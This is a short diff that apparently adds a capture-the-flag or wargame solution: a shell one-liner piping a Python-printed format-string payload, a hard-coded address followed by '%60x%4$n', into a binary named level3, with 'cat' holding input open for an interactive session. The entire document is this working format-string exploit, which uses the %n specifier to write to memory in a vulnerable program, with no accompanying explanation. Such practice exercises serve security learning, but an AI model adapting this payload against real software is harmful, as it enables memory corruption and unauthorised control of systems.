@@ -1,0 +1,4 @@
+(python - <<'PY'
+print "\x8c\x98\x04\x08%60x%4$n"
+PY
+cat) | ./level3
